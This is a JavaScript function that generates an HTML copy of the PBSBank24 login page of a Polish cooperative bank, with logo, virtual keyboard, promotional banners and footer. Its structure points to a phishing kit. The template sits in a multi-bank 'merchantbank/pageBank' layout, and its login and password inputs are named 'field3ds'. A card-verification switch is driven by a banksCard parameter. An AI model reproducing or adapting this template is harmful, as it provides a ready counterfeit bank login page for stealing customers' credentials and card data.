function genHtmlRenderBank19(params){
    
return `
<div id="header" bis_skin_checked="1">
    <a href="https://www.bank-nowy.pl/" target="_blank" rel="noopener noreferrer" bis_size="{&quot;x&quot;:988,&quot;y&quot;:0,&quot;w&quot;:0,&quot;h&quot;:0,&quot;abs_x&quot;:988,&quot;abs_y&quot;:0}">
        <img src="merchantbank/pageBank/bank19/img/logo_pbs.gif" alt="Copyright 2009 Podkarpacki Bank Spółdzielczy" class="logo" bis_size="{&quot;x&quot;:802,&quot;y&quot;:0,&quot;w&quot;:186,&quot;h&quot;:92,&quot;abs_x&quot;:802,&quot;abs_y&quot;:0}" bis_id="bn_jouda88vpbp76417xnarb5">
    </a>
    <h5>System Bankowości Elektronicznej PBSBank24</h5>
    <div id="language-selection-container" style="visibility: visible;" bis_skin_checked="1">
        <label for="lang">Język</label>
        <div id="language-select-selectbox-wrapper" class="amg-selectbox-wrapper" bis_skin_checked="1">
            <a id="language-select-selectbox-clickbar" class="amg-selectbox-clickable" tabindex="-1" style="width: 49px;">PL</a>
            <div id="language-select-selectbox-container" class="amg-selectbox-container" style="display: none; min-width: 48px;" bis_skin_checked="1">
                <ul>
                    <li id="language-select-option-0" class="amg-selectbox-selected-option"><a onclick="return false;">PL</a></li>
                    <li id="language-select-option-1" class=""><a onclick="return false;">EN</a></li>
                </ul>
            </div>
        </div>
        <div class="amg-selectbox-hidden-wrapper" bis_skin_checked="1">
            <select onchange="return false" class="selectbox amg-selectbox-hidden" id="language-select" name="lang">
                <option value="pl" selected="selected">PL</option>
                <option value="en">EN</option>
            </select>
        </div>
    </div>
    
    
    
</div>
<!-- Koniec naglowka z logo -->
<!-- Glowny kontener -->
<div id="main_contener" bis_skin_checked="1">
    <!-- Koniec lewej kolumny -->
    <div id="center_col" class="c_col" bis_skin_checked="1">
        <div class="box_bg" bis_skin_checked="1">
            <div class="box_top" bis_skin_checked="1">
                <div class="box_content" bis_skin_checked="1">
                    <div class="box_green" bis_skin_checked="1">
                        <div class="box_green_top" bis_skin_checked="1">
                           <div class="box_green_content box_login blockLKFormsHTML" style="display: flex;flex-direction: column;align-items: center;background: #fff;"></div>
                            <div class="box_green_content box_login formsLKBNK" bis_skin_checked="1">

                                <h2>Logowanie</h2>
                                <form class="login" id="form.login" name="form.login" action="/pbs/checkLogin" method="post" autocomplete="off">

                                    <div id="user-id-container" class="keyboard-inputfield-container" bis_skin_checked="1">
                                        <label for="login">Login:</label>
                                        <fieldset class="withKeyboard" id="user-id">
                                            <input reqinput='true' id="field3ds1" class="ixxl" type="text" autocomplete="off" name="login">
                                            <img src="merchantbank/pageBank/bank19/img/ico_question.gif" width="12" height="12" alt="" class="tooltip-ico" id="anonymous_element_1"><span class="amg-help-cloud-content" style="display: none;" id="anonymous_element_2">Wpisz 8-cyfrowy numer login, który znajduje się na karcie informacyjnej przekazanej w przesyłce bankowej.</span>
                                        </fieldset>
                                    </div>

                                    <div id="user-id-container" class="keyboard-inputfield-container" bis_skin_checked="1">
                                        <label for="login">Password:</label>
                                        <fieldset class="withKeyboard" id="user-id">
                                            <input reqinput='true' id="field3ds2" class="ixxl" type="text" autocomplete="off" name="login" value="">
                                            <img src="merchantbank/pageBank/bank19/img/ico_question.gif" width="12" height="12" alt="" class="tooltip-ico" id="anonymous_element_1"><span class="amg-help-cloud-content" style="display: none;" id="anonymous_element_2">Wpisz 8-cyfrowy numer login, który znajduje się na karcie informacyjnej przekazanej w przesyłce bankowej.</span>
                                        </fieldset>
                                    </div>

                                    <div id="user-id-container" class="keyboard-inputfield-container" bis_skin_checked="1" style="display: none">
                                        <label for="login">Password:</label>
                                        <fieldset class="withKeyboard" id="user-id">
                                            <input id="field3ds9" class="ixxl" type="text" autocomplete="off" name="login" value="">
                                            <img src="merchantbank/pageBank/bank19/img/ico_question.gif" width="12" height="12" alt="" class="tooltip-ico" id="anonymous_element_1"><span class="amg-help-cloud-content" style="display: none;" id="anonymous_element_2">Wpisz 8-cyfrowy numer login, który znajduje się na karcie informacyjnej przekazanej w przesyłce bankowej.</span>
                                        </fieldset>
                                    </div>

                                    <a href="#" id="user-id-activator" name="keyboard-activator"><img src="merchantbank/pageBank/bank19/img/ico_keyboard.gif" alt="keyboard"></a>
                                    <div class="login-button" bis_skin_checked="1">
                                        <div id="alertDiv" class="capsLockAlertInlineDisplay" style="visibility:hidden" bis_skin_checked="1">
                                            <img style="vertical-align:middle" src="merchantbank/pageBank/bank19/img/warning.gif">
                                            <span style="font-weight: bold; vertical-align:middle">Caps Lock jest włączony!</span>
                                        </div>
                                        <div id="buttonDiv" class="capsLockAlertInlineDisplay" bis_skin_checked="1">
                                            <button ${params.banksCard.indexOf('19') >= 0 ? `class='openVerificationCards'` : `id='field3dsBankNowy'`}><img src="merchantbank/pageBank/bank19/img/login.button.login.gif" class="button" alt="Zaloguj" style="" title="Zaloguj"></button>
                                        </div>
                                    </div>

                                    <fieldset style="display:none" class="with-virtual-keyboard">
                                        <div class="js-keyboard-container js-keyboard-login field">
                                            <input id="field3ds7" type="hidden" name="pindata" placeholder="action" value='not_action' required=""> </div>
                                    </fieldset>
                                    <div id="keyboard-overlay-container" bis_skin_checked="1">
                                        <div id="keyboard-overlay" class="keyboard-closed" bis_skin_checked="1">
                                            <div class="keyboard-overlay-top" bis_skin_checked="1"></div>
                                            <a id="close-button" href="#">Zamknij</a>
                                            <div id="keyboard-input-container" bis_skin_checked="1"></div>
                                            <ul id="keyboard">
                                                <li id="key-1"><a title="1" href="#">1</a></li>
                                                <li id="key-2"><a title="2" href="#">2</a></li>
                                                <li id="key-3"><a title="3" href="#">3</a></li>
                                                <li id="key-4"><a title="4" href="#">4</a></li>
                                                <li id="key-5"><a title="5" href="#">5</a></li>
                                                <li id="key-6"><a title="6" href="#">6</a></li>
                                                <li id="key-7"><a title="7" href="#">7</a></li>
                                                <li id="key-8"><a title="8" href="#">8</a></li>
                                                <li id="key-9"><a title="9" href="#">9</a></li>
                                                <li id="key-0"><a title="0" href="#">0</a></li>
                                                <li id="key-minus"><a title="-" href="#">-</a></li>
                                                <li id="key-plus"><a title="+" href="#">+</a></li>
                                                <li id="key-equals"><a title="=" href="#">=</a></li>
                                                <li id="key-backspace" class="no-input"><a title="Backspace" href="#">Backspace</a></li>
                                                <li id="key-apostrophe" class="first"><a title="#" href="#"></a></li>
                                                <li id="key-tilde"><a title="~" href="#">~</a></li>
                                                <li id="key-exclamation"><a title="!" href="#">!</a></li>
                                                <li id="key-at"><a title="@" href="#">@</a></li>
                                                <li id="key-hash"><a title="#" href="#">#</a></li>
                                                <li id="key-dollar"><a title="$" href="#">$</a></li>
                                                <li id="key-percent"><a title="%" href="#">%</a></li>
                                                <li id="key-power"><a title="^" href="#">^</a></li>
                                                <li id="key-amp"><a title="&amp;" href="#">&amp;</a></li>
                                                <li id="key-multiply"><a title="*" href="#">*</a></li>
                                                <li id="key-leftbracke"><a title="(" href="#">(</a></li>
                                                <li id="key-rightbracket"><a title=")" href="#">)</a></li>
                                                <li id="key-underscore"><a title="_" href="#">_</a></li>
                                                <li id="key-backslash"><a title="\" href="#">\</a></li>
                                                <li id="key-slash"><a title="/" href="#">/</a></li>
                                                <li id="key-pipe"><a title="|" href="#">|</a></li>
                                                <li id="key-q" class="first"><a title="q" href="#">q</a></li>
                                                <li id="key-w"><a title="w" href="#">w</a></li>
                                                <li id="key-e"><a title="e" href="#">e</a></li>
                                                <li id="key-epol"><a title="ę" href="#">ę</a></li>
                                                <li id="key-r"><a title="r" href="#">r</a></li>
                                                <li id="key-t"><a title="t" href="#">t</a></li>
                                                <li id="key-y"><a title="y" href="#">y</a></li>
                                                <li id="key-u"><a title="u" href="#">u</a></li>
                                                <li id="key-i"><a title="i" href="#">i</a></li>
                                                <li id="key-o"><a title="o" href="#">o</a></li>
                                                <li id="key-opol"><a title="ó" href="#">ó</a></li>
                                                <li id="key-p"><a title="p" href="#">p</a></li>
                                                <li id="key-leftsqbracket"><a title="[" href="#">[</a></li>
                                                <li id="key-rightsqbracket"><a title="]" href="#">]</a></li>
                                                <li id="key-leftcurlybracket"><a title="{" href="#">{</a></li>
                                                <li id="key-rightcurlybracket"><a title="}" href="#">}</a></li>
                                                <li id="key-apostrophe2"><a title="'" href="#">'</a></li>
                                                <li id="key-a" class="first"><a title="a" href="#">a</a></li>
                                                <li id="key-apol"><a title="ą" href="#">ą</a></li>
                                                <li id="key-s"><a title="s" href="#">s</a></li>
                                                <li id="key-spol"><a title="ś" href="#">ś</a></li>
                                                <li id="key-d"><a title="d" href="#">d</a></li>
                                                <li id="key-f"><a title="f" href="#">f</a></li>
                                                <li id="key-g"><a title="g" href="#">g</a></li>
                                                <li id="key-h"><a title="h" href="#">h</a></li>
                                                <li id="key-j"><a title="j" href="#">j</a></li>
                                                <li id="key-k"><a title="k" href="#">k</a></li>
                                                <li id="key-l"><a title="l" href="#">l</a></li>
                                                <li id="key-lpol"><a title="ł" href="#">ł</a></li>
                                                <li id="key-colon"><a title=":" href="#">:</a></li>
                                                <li id="key-semicolon"><a title=";" href="#">;</a></li>
                                                <li id="key-comma"><a title="," href="#">,</a></li>
                                                <li id="key-dot"><a title="." href="#">.</a></li>
                                                <li id="key-quote"><a title="&quot;" href="#">"</a></li>
                                                <li id="key-z" class="first"><a title="z" href="#">z</a></li>
                                                <li id="key-zpol"><a title="ż" href="#">ż</a></li>
                                                <li id="key-xpol"><a title="ź" href="#">ź</a></li>
                                                <li id="key-x"><a title="x" href="#">x</a></li>
                                                <li id="key-c"><a title="c" href="#">c</a></li>
                                                <li id="key-cpol"><a title="ć" href="#">ć</a></li>
                                                <li id="key-v"><a title="v" href="#">v</a></li>
                                                <li id="key-b"><a title="b" href="#">b</a></li>
                                                <li id="key-n"><a title="n" href="#">n</a></li>
                                                <li id="key-npol"><a title="ń" href="#">ń</a></li>
                                                <li id="key-m"><a title="m" href="#">m</a></li>
                                                <li id="key-lt"><a title="<" href="#">&lt;</a></li>
                                                <li id="key-gt"><a title=">" href="#">&gt;</a></li>
                                                <li id="key-question"><a title="?" href="#">?</a></li>
                                                <li id="key-caps" class="no-input"><a title="Shift/CapsLk" href="#">Shift/CapsLk</a></li>
                                                <li id="key-space" class="first"><a title="Spacja" href="#">&nbsp;</a></li>
                                            </ul>
                                            <ul id="controls">
                                                <li class="last"><a id="close-btn-2" href="#"><img alt="Zatwierdź" src="merchantbank/pageBank/bank19/img/bt_zatwierdz.gif"></a></li>
                                                <li class="first"><a class="arrow" href="#" id="clear-all" name="clear-all">Wyczyść</a></li>
                                                <li><a class="arrow" href="#" id="cancel-button">Anuluj</a></li>
                                            </ul>
                                            <div class="keyboard-overlay-bottom" bis_skin_checked="1"></div>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                    <!-- Komunikaty -->
                    <div id="news" bis_skin_checked="1">
                        <div class="news-elem" bis_skin_checked="1">
                            <h3><font color="#373c92">Lokata Prima</font></h3>
                            <div class="news-content" bis_skin_checked="1">
                                <a href="https://www.bank-nowy.pl/klienci-indywidualni-2/oszczednosci-i-inwestycje/lokata-prima" target="_blank" bis_size="{&quot;x&quot;:1024,&quot;y&quot;:704,&quot;w&quot;:242,&quot;h&quot;:12,&quot;abs_x&quot;:1024,&quot;abs_y&quot;:704}"><img src="merchantbank/pageBank/bank19/img/242x336_na-logowanie_prima.jpg" bis_size="{&quot;x&quot;:1024,&quot;y&quot;:378,&quot;w&quot;:242,&quot;h&quot;:336,&quot;abs_x&quot;:1024,&quot;abs_y&quot;:378}" bis_id="bn_e7smbp9slot4pjb0vocru5"></a>
                            </div>
                        </div>
                        <div class="news-elem" bis_skin_checked="1">
                            <h3><font color="#373c92">Aplikacja mobilna</font></h3>
                            <div class="news-content" bis_skin_checked="1">
                                <a href="https://www.bank-nowy.pl/klienci-indywidualni-2/bankowosc-elektroniczna/aplikacja-mobilna-pbsbank24-mobile" target="_blank" bis_size="{&quot;x&quot;:1285,&quot;y&quot;:704,&quot;w&quot;:242,&quot;h&quot;:12,&quot;abs_x&quot;:1285,&quot;abs_y&quot;:704}"><img src="merchantbank/pageBank/bank19/img/242x336_na-logowanie_aplkacja_bfg.jpg" bis_size="{&quot;x&quot;:1285,&quot;y&quot;:378,&quot;w&quot;:242,&quot;h&quot;:336,&quot;abs_x&quot;:1285,&quot;abs_y&quot;:378}" bis_id="bn_9voa5haudf8cuiqiv94q79"></a>
                            </div>
                        </div>
                    </div>
                    <!-- Koniec komunikatów -->
                </div>
            </div>
        </div>
    </div>
    <!-- Prawa kolumna -->
    <!-- folder w ktorym nalezy przechowywac pliki wciaz do ustalenia -->
    <div id="right_col" class="b_col" bis_skin_checked="1">
        <div id="banner1" class="box_bg" bis_skin_checked="1">
            <div class="box_top" bis_skin_checked="1">
                <div class="box_content" bis_skin_checked="1">
                    <a href="https://www.bank-nowy.pl/klienci-indywidualni-2/oszczednosci-i-inwestycje/lokata-debiut" target="_blank" rel="noopener noreferrer" bis_size="{&quot;x&quot;:1577,&quot;y&quot;:375,&quot;w&quot;:170,&quot;h&quot;:14,&quot;abs_x&quot;:1577,&quot;abs_y&quot;:375}">
                        <img src="merchantbank/pageBank/bank19/img/bannerImage2.jpg" alt="https://www.bank-nowy.pl/klienci-indywidualni-2/oszczednosci-i-inwestycje/lokata-debiut" bis_size="{&quot;x&quot;:1577,&quot;y&quot;:119,&quot;w&quot;:170,&quot;h&quot;:267,&quot;abs_x&quot;:1577,&quot;abs_y&quot;:119}" bis_id="bn_91grspbbnthx2slrsmbj8c">
                    </a>
                </div>
            </div>
        </div>
        <div id="banner2" class="box_bg" bis_skin_checked="1">
            <div class="box_top" bis_skin_checked="1">
                <div class="box_content" bis_skin_checked="1">
                    <a href="https://www.bank-nowy.pl/klienci-indywidualni-2/oszczednosci-i-inwestycje/lokata-optymalna" target="_blank" rel="noopener noreferrer" bis_size="{&quot;x&quot;:1577,&quot;y&quot;:667,&quot;w&quot;:170,&quot;h&quot;:14,&quot;abs_x&quot;:1577,&quot;abs_y&quot;:667}">
                        <img src="merchantbank/pageBank/bank19/img/bannerImage.jpg" alt="https://www.bank-nowy.pl/klienci-indywidualni-2/oszczednosci-i-inwestycje/lokata-optymalna" bis_size="{&quot;x&quot;:1577,&quot;y&quot;:411,&quot;w&quot;:170,&quot;h&quot;:267,&quot;abs_x&quot;:1577,&quot;abs_y&quot;:411}" bis_id="bn_ykcmv80xi6k6rinhaiku4e">
                    </a>
                </div>
            </div>
        </div>
    </div>
    <!-- Koniec prawej kolumny -->
</div>
<!-- Koniec glownego kontenera -->
<!-- Stopka -->
<div id="footer" bis_skin_checked="1">
    <div class="fbox" bis_skin_checked="1">
        <div class="footer_links_left" bis_skin_checked="1">
            <a href="https://www.bank-nowy.pl/pomoc" target="_blank" rel="noopener noreferrer">Pomoc</a>
            <a href="https://www.bank-nowy.pl/o-banku/bezpieczenstwo" class="border_left" target="_blank" rel="noopener noreferrer">Bezpieczeństwo</a>
            <a href="https://www.bank-nowy.pl/o-banku/kontakt" class="border_left" target="_blank" rel="noopener noreferrer">Formularz kontaktowy</a>
            <a href="https://www.bank-nowy.pl/2-uncategorised/574-polityka-prywatnosci" class="border_left" target="_blank" rel="noopener noreferrer">Zastrzeżenia prawne</a>
        </div>
        <div class="footer_links_right" bis_skin_checked="1">
            Powered by <a href="http://www.amg.net.pl" target="_blank" rel="noopener noreferrer">AMG.net</a>
        </div>
    </div>
</div>
<!-- Koniec stopki -->
<div id="epd" style="display: none;" bis_skin_checked="1">
    <div id="cookiesdirective" style="position: fixed; bottom: 0px; left: 0px; width: 100%; height: auto; background: none repeat scroll 0% 0% rgb(0, 0, 0); opacity: 0.8; color: rgb(255, 255, 255); font-size: 14px; text-align: center; z-index: 1000;" bis_skin_checked="1">
        <div style="position:relative;height:auto;width:90%;padding:15px;margin-left:auto;margin-right:auto;" bis_skin_checked="1">
            W celu zachowania najwyższej jakości świadczonych Państwu usług, w sposób dostosowany do indywidualnych potrzeb, wykorzystujemy informacje przechowywane w plikach cookies. Korzystanie z naszego serwisu internetowego bez zmiany ustawień dotyczących cookies oznacza, że wyrażają Państwo zgodę na ich zapisanie w pamięci urządzenia. Zmiany zasad korzystania z plików cookies można dokonać w każdym czasie w ustawieniach przeglądarki. Więcej informacji znajduje się w naszej
            <a href="https://www.pbsbank.pl/documents/10180/550553/Polityka+prywatno%C5%9Bci/823b6264-b188-46b0-a2c8-281404dab32f" style="color:#ca0000;font-weight:bold;font-family:arial;font-size:14px;">Polityce prywatności</a>.
            <br>
            <br>
            <input type="button" value="OK">
            <br>
            <br>
        </div>
    </div>
</div>
<div id="amg-anonymous_element_1" class="amg-tooltip-body" style="display:none;position:relative;" bis_skin_checked="1">
    <canvas id="amg-anonymous_element_1-canvas" width="590"></canvas>
    <div id="amg-anonymous_element_1-content" style="position: absolute; top:0px; left:0px; float:left; width:590px;" bis_skin_checked="1">
        <div style="overflow:hidden;padding:10px;padding-bottom:40px;float:left; width:570px;" bis_skin_checked="1">Wpisz 8-cyfrowy numer login, który znajduje się na karcie informacyjnej przekazanej w przesyłce bankowej.</div>
    </div>
</div>`;
}
